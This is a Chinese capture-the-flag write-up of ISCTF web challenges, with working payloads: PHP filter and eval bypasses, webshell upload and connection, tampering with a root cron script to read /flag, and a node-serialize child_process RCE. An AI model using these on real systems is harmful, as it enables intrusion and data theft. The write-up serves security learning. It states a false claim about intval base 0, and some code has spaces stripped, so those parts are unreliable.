## ISCTF

### WEB

#### 25时晓山瑞希生日会

提示要是Project Sekai的客户端请求，所以

User-Agent:Project Sekai

提示只能从本地来！,所以

X-Forwarded-For:127.0.0.1

提示你似乎没在正确的时间来...，

Date:Sat, 27 Aug 2024 5:00:00 GMT

#### 小蓝鲨的冒险

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$a = "isctf2024";
$b = $_GET["b"];
@parse_str($b);
echo "小蓝鲨开始闯关，你能帮助他拿到flag吗?<br>";
if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
    $num = $_POST["num"];
    echo "第一关有惊无险！小蓝鲨壮着胆子接着继续往下走！<br>";
    if($num == 2024){
        die("QAQ小蓝鲨误入陷阱，不怕，再接再厉！");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("陷阱太多QAQ");
    }
    if(intval($num,0) == 2024){
        echo "到这了难道还要放弃吗？<br>";
        if (isset($_GET['which'])){
            $which = $_GET['which'];
            echo "小蓝鲨貌似在哪里见过这个陷阱O.o?继续加油，还差最后一步了！";
            switch ($which){
                case 0:
                    print('QAQ');
                case 1:
                case 2:
                    require_once $which.'.php';
                    echo $flag;
                    break;
                default:
                    echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
                    break;
            }
        }
    }
}
```

switch没有break，所以直接传flag

get:`/?b=a[0]=s155964671a&which=flag`

if(intval($num,0) == 2024)

在 PHP 中，`intval($num, 0)` 函数将字符串或数字转换为整数，并且第二个参数 `0` 指定了使用默认的基数（即十进制）。

所以可以传入浮点数绕过。

post:`num=2024.2`

#### 1z_php

post: `J=sort /f14g;`

#### ezserialize

```php
<?php
error_reporting(0);

class Flag {
    private $flag;

    public function __construct() {
        $this->flag = file_get_contents('/flag');
    }

    public function getFlag() {
        return $this->flag;
    }

    public function __toString() {
        return "You can't directly access the flag!";
    }
}

class User {
    public $username;
    public $isAdmin = false;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Welcome, admin! Here's your flag: " . (new Flag())->getFlag();
        } else {
            echo "Hello, " . htmlspecialchars($this->username) . "!";
        }
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];

    $object = unserialize($data);
    if ($object instanceof User) {
        echo $object;
    } else {
        echo "Invalid object!";
    }
} else {
    highlight_file(__FILE__);



$pop = new User('admin');
$pop->isAdmin = true;
echo serialize($pop);

}
?>
```

#### UP!UPloader

先上传一个一句化木马shell.php，但是不给我上传的地址。提示我去到include.php，发现可以执行include函数，于是传参 `?filename=php://filter/read=convert.base64-encode/resource=upload.php`看看upload.php怎么写的。

代码：

```php
<?php
error_reporting(0);
$file = $_FILES['file'];
if (isset($file) && $file['size'] > 0) {
    $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
    $name = pathinfo($file['name'], PATHINFO_FILENAME);
    $dir_name = $name . '.' . $ext;
    $upload_dir = './uploads/';
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    if (move_uploaded_file($file['tmp_name'], $upload_dir . md5($dir_name) . '.' . $ext)) {
        echo "文件上传成功！不过文件路径可不好找呀~什么？什么include.php？我不知道啊。" ;
    } else {
        echo "文件存储失败，未知原因......";
    }
    die();
}
?>
```

发现对文件名进行MD5加密，并上传到/uploads目录里，于是手动对一句话木马shell.php进行md5加密，得到：25a452927110e39a345a2511c57647f2

蚁剑连接/uploads/25a452927110e39a345a2511c57647f2.php，发现根目录和网站目录都没有flag，于是命令行执行代码env看环境变量，发现flag

#### ezrce

```php
<?php

error_reporting(0);

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    if (preg_match("/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&\>\<]|eval|system|exec|popen|shell_exec/i", $cmd)) {
        die("Blocked by security filter!");
    } else {
        eval($cmd);
    }
} else {
    highlight_file(__FILE__);
}
?>

```

echo被禁用，使用printf。

/?cmd=printf(`l\s%09/`);发现flag

/?cmd=printf(`tac%09/fla?`);得到flag

#### 小蓝鲨的秘密

打开后发现是蓝鲨官网，复制题目链接发现并不直接是滥杀官网。于是打开F12，访问题目链接，在响应头中发现flag。

#### 小蓝鲨的临时存储室

访问发现可以直接上传php文件，于是上传一句话木马，用蚁剑连接。

在根目录发现了一个/flag文件，但是权限设置为600，我读不了啊。

正在我左翻右翻的时候发现蚁剑突然不能用了，我一看，shell不见了？？？

于是重新上传一句话木马，看根目录的/down_file.sh文件。

```bash
#!/bin/bash

find /var/www/localhost/htdocs/uploads/ -type f -name "*.php" -exec rm -f {} \;

```

嗷原来就是这玩意在删我马，赶紧注释掉！

同时猜测，这应该是个定时文件，自动删码。

在根目录还有另一个脚本文件/start.sh，根据名字我猜是docker启动时自动执行的脚本。

```bash
#!/bin/sh
if [ -z "$FLAG" ]; then
  echo "Error: FLAG environment variable is not set."
  exit 1
fi

echo "$FLAG" >> /flag

chmod 600 /flag
chown root:root /flag

crond -f &
unset FLAG

httpd -D FOREGROUND

```

脚本大概作用是：

1. **检查 **`FLAG`** 环境变量是否设置**
2. 将 `FLAG`的值追加到 `/flag`**文件** ：
3. 设置 `/flag`**文件权限和所有者** ：`chmod 600 /flag` 设置文件权限为只有所有者可以读写。`chown root:root /flag` 将文件的所有者和所有组设置为 `root`。
4. 启动 *`cron` *服务** ：
5. 取消设置 *`FLAG` *环境变量** ：
6. **启动 Apache HTTP 服务器** ：

于是破案啦，本来环境变量里是有flag的，但是在start.sh文件中被删除了。把flag转移到了/flag中，并且设置了只有所有者可以读写，所以我打开啥都没有。

于是乎，现在的问题就是怎样用root权限读取/flag。

突然想起来/down_file.sh不是一个定时执行删马吗。它应该有权限读取/flag吧。

于是在/down_file.sh中加入 `cat /flag >>/var/www/localhost/htdocs/uploads/1.txt`

稍等一会，访问 `/uploads/1.txt`，果然有flag了。


#### 小蓝鲨的故事

拿到题只有一句没用的话，和一个跳转到比赛官网的超链接，超链接也不存在跳转。

hint提示robots.txt里是key，打开robots.txt

```
User-agent: *
Disallow: /
ohr7usIc
娆㈣繋浣燞acker
```

很容易就能猜到第一行就是key了。

第二行因为编码问题导致乱码，实际是欢迎你，hacker。

又注意到网站的cookies中有session，结合又知道key，猜测后台是flask，存在session伪造。

用 `flask-session-cookie-manager`解码发现session格式如下。

`{'username': b'www-data'}`

我拿admin、root试了一下，发现没什么用。

用web里的各种英文单词试后台，终于试到了/Hacker

在里面发现了主人公名字叫**ISctf_Hacker**。

有了username就可以伪造session在各个路由里试，但都没作用

于是dirsearch扫描后台发现以下路由

```
[03:49:48] 200 -    2KB - /console                                       
[03:50:26] 200 -   31B  - /flag                                          
[03:51:38] 200 -   50B  - /robots.txt                                      
```

/console是flask的调试路由，由于没有pin所以放过他。

刚好，在/flag路由传入伪造的session就可以得到flag了。

这里因为这道题从前一天晚上打到了第二天，导致容器中断过一回。

第二天还拿前一天的key伪造session，导致一直没有做出来题。

后来实在找不到路了，看了一眼robots发现端倪：key不一样了(〒︿〒)(〒︿〒)(〒︿〒)。

#### ezlogin

app.js :

```js

constexpress = require('express');

constapp = express();

constbodyParser = require('body-parser');

varcookieParser = require('cookie-parser');

varserialize = require('node-serialize');

app.use(bodyParser.urlencoded({ extended:true }));

app.use(cookieParser())

app.set('view engine', 'ejs');

app.set('views', './views');


users={"guest":"123456"}


functionauth(req, res, next) {

  if(req.cookies.token){

    constuser = serialize.unserialize(Buffer.from(req.cookies.token,'base64').toString());

    if (!user.username) {

        returnres.status(401).redirect('/login');

    }

  }else{

    returnres.status(401).redirect('/login');

  }

  next();

}


app.get('/index',auth,function(req,res){

    res.render("index");

});



app.get('/register',function(req,res){

    res.render("register");

});


app.post('/register',function(req,res){

    username = req.body.username;

    password = req.body.password;


    if (!username||!password) {

      returnres.status(400).send('用户名和密码都是必填项');

    }

    if (users[username]) {

      returnres.status(409).send('用户名已存在');

    }

    users[username] = password;  

    returnres.status(201).send('用户注册成功');

});


app.get('/login',function(req,res){

  res.render("login");

});


app.post('/login',function(req,res){

  username = req.body.username;

  password = req.body.password;

  if (!username||!password) {

    returnres.status(400).send('用户名和密码都是必填项');

  }

  if (!(users[username])) {

    returnres.status(409).send('用户名不存在');

  }else{

    if(users[username] ===password){

      token=Buffer.from(serialize.serialize({'username':username,'isAdmin':false})).toString('base64')

      res.cookie('token',token, {

        maxAge:900000,

        httpOnly:true

      });

      returnres.status(200).redirect('/index');

    }else{

      returnres.status(200).send('密码错误');

    }

  }


});


// 启动服务器

app.listen(80, () => {

  console.log(`Server running at http://localhost:80`);

});

```

观察代码发现有一个auth()函数会反序列化token，在这里存在rce。

上网查询找到payload：`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls',function(error, stdout, stderr){console.log(stdout)});}()"}`

但是反序列化过后没有回显，并且自动跳转/login。

考虑反弹shell，由于没有公网ip，所以在kali上使用ngrok进行内网穿透。

但是无论如何也无法getshell，无法判断到底是命令执行不成功还是我的监听有问题。

借助我好友友的电脑反弹了一下shell发现成功了，于是排除监听的问题。

经过学长的提醒可以执行sleep，判断命令是否成功执行。

但是执行sleep 5后很快啊，就得到了响应，一点也不睡。

> 学长说 `大抵是因为nodejs异步编程，并且反序列化出来的这个只是个函数自己去后台执行了，并不会阻塞web端的正常处理`。

于是尝试标准重定向到./views/login.ejs，在请教学长的过程中也是得到了知识的洗礼。

最终payload: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag > ./views/login.ejs',function(error, stdout, stderr){console.log(stdout)});}()"}`。

## 知识总结

### PHP

在 PHP 中，`intval($num, 0)` 函数将字符串或数字转换为整数，并且第二个参数 `0` 指定了使用默认的基数（即十进制）。

### Linux权限

文件权限由三个部分组成：用户（User）、组（Group）、其他人（Others）。每个部分都有三种权限：读（r）、写（w）和执行（x）。让我们详细了解一下：

#### 权限表示

权限使用十个字符表示，前九个字符按三组排列，分别表示用户、组和其他人对文件的权限。第一个字符表示文件类型，例如：

* `-`：普通文件
* `d`：目录
* `l`：符号链接

#### 权限示例

假设有一行权限信息如下：

```bash
-rwxr-xr--
```

解释如下：

1. `-`：表示这是一个普通文件。
2. `rwx`：用户（文件所有者）的权限，表示有读、写和执行权限。
3. `r-x`：组的权限，表示有读和执行权限，没有写权限。
4. `r--`：其他人的权限，表示只有读权限。

#### 权限位

* **读 (r)** ：查看文件内容或列出目录内容的权限。
* **写 (w)** ：修改文件内容或在目录中创建、删除文件的权限。
* **执行 (x)** ：执行文件或访问目录内容的权限。

#### 更改文件权限

使用 `chmod` 命令可以更改文件和目录的权限。有两种表示方式：符号表示法和八进制表示法。

符号表示法

* `u`：用户
* `g`：组
* `o`：其他人
* `a`：所有人

示例：

```bash
chmodu+x filename   # 给文件所有者增加执行权限
chmodg-w filename   # 去掉组的写权限
chmodo+r filename   # 给其他人增加读权限
```

##### 八进制表示法

每种权限对应一个数字：

* 读 (r)：4
* 写 (w)：2
* 执行 (x)：1

组合这些数字来表示权限：

* `7`：读、写、执行（4+2+1）
* `6`：读、写（4+2）
* `5`：读、执行（4+1）
* `4`：读（4）

示例：

```bash
chmod755 filename   # 设置文件权限为-rwxr-xr-x
```

#### 更改文件所有者和组

使用 `chown` 和 `chgrp` 命令可以更改文件的所有者和组。

示例：

```bash
chownuser filename   # 更改文件所有者为 user
chgrpgroup filename  # 更改文件组为 group
```



### HTTP

Request 消息分为3部分，第一部分叫Request line, 第二部分叫Request header, 第三部分是body. **header和body之间有个空行**， 如果没有空行会得不到响应。

### 文件描述符及重定向

linux文件描述符:linux shell下有三种标准的文件描述符，分别如下

> 0-stdin 代表标准输入,使用<或<<

> 1-stdout 代表标准输出,使用>或>>

> 2-stderr 代表标准错误输出,使用2>或2>>

重定向：

> linux默认将标准输出和标准错误输出到shell中，使用重定向符号可以将输出重定向到其他地方，可以重定向到文件或设备中。

> *`>`代表以覆盖的方式将命令的正确输出输出到指定的文件或设备当中，比如之前剧ctfshow见过的>/dev/nu11 2>&1

> *`>>`代表以追加方式输出。

> * 而以上不带&的都只能将正常输入重定向，而加上&的&>可以将正常输出和错误输出都重定向

> 常见的输出重定向:

> 1. 命令>>文件 2>&1:以追加的方式把正确和错误输出都保存在文件中。其中第一个>>就等价于1>>，默认为标准输出重定向(1代表标准屏幕输出、2代表错误输出);2>&1即意为把标准错误输出(2)重定向到标准正常输出(1)。

> 2. 命令 &>文件名:以覆盖(?)的方式将正确和错误输出都保存在文件中。

> 3. 命令 &>>文件名:以追加(?)的方式将正确和错误输出都保存在文件中。

> 4. 命令 >> 文件A 2>>文件B:正确的输出到A文件中，错误的输出到B文件中。

> 错误输出2和重定向符之间不能有空格，重定向符前无数字即默认为标准正常输出(1)。

> 输入重定向:

> * 命令<文件名:即把文件作为命令的输入，比如之前剧题常见的过滤空格把fag:php作为打开文件命令的输入:cat<flag.php、nl<flag.phptac、<flag.php等等
>
